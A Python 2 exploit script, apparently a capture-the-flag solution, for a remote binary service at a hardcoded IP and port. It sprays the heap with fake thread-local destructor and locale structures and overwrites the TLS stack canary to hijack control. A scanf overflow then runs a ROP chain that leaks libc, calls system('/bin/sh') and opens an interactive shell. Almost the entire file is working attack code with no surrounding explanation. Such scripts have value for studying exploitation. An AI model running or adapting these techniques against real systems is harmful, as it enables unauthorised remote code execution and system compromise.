#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='# '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) > 0
        data += c
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

def heap_overflow(f, size, data):
    assert '\n' not in data
    f.write('1\n')
    readuntil(f, '? ')
    f.write(str(size) + '\n')
    readuntil(f, ': ')
    f.write(data + '\n')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('104.197.7.111', 1002))
f = s.makefile('rw', bufsize=0)

leave_message = 0x400D79
# Guessed heap pointer - we spray and brute the heap address.
heap_ptr = 0x1938810
# To make spraying simpler, use the heap pointer as the value to
# overwrite the stack canary with.
stack_canary = heap_ptr
pop_rdi_ret = 0x401503
stdin_ptr = 0x602100
puts = 0x400B00

# \x07 is considered whitespace and will terminate scanf.
fake_ctype_table = 0x602106
whitespace_char = '\x07'

spray = ''
spray += p(1)

# Fake thread local destructor (struct dtor_list)
spray += p(leave_message) # fun ptr
spray += p(fake_ctype_table)
spray += p(0)
spray += p(heap_ptr - 0x38)
# Fake locale structure starts here. Because leave_message uses scanf,
# this needs to be valid, and also not consider too many characters as
# whitespace (since scanf terminates on whitespace).
spray += p(heap_ptr + 8)
spray += p(heap_ptr - 0x48 + 0x20)
spray += p(0)

packet_size = len(spray)

# Spray the non-mmap heap with our fake structures.
spray_len = 8192*16 - 0x18
heap_overflow(f, spray_len, spray * (spray_len / packet_size))

payload = '\x00' * 0x100000

# Offset to the page that TLS lives on.
payload += '\x00' * 4080
# 0x1740 is (approximately) the page offset of the TLS (FS base).
payload += p(heap_ptr + 0x28) * (0x1740 / 8)
payload += p(heap_ptr) * 0x400

# Since this overwrite modifies the stack canary, the function will call
# stack_chk_fail, which eventually exits and triggers our thread local
# destructors.
heap_overflow(f, 0x100000, payload)

# Now we should be calling leave_message, which contains a trivial scanf
# buffer overflow (and we know the canary, since we overwrote it).
readuntil(f, ': ')

read_until_newline = 0x400E94
pop_rbp_ret = 0x40149a
leave_ret = 0x400ddf
writable = 0x603000 - 64

payload = 'A' * 248
payload += p(stack_canary)
payload += 'A' * 8
payload += p(pop_rdi_ret)
payload += p(stdin_ptr)
payload += p(puts)
payload += p(pop_rdi_ret)
payload += p(writable)
payload += p(read_until_newline)
payload += p(pop_rbp_ret)
payload += p(writable)
payload += p(leave_ret)

f.write(payload + whitespace_char)

stdin = u(f.read(6).rstrip('\n').ljust(8, '\0'))
libc_base = stdin - 0x3bf640
print 'libc_base =', hex(libc_base)
system = libc_base + 0x46640
binsh = libc_base + 0x17ccdb

rop = 'X' * 7 # the whitespace char from above counts
rop += p(pop_rdi_ret)
rop += p(binsh)
rop += p(system)
f.write(rop + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
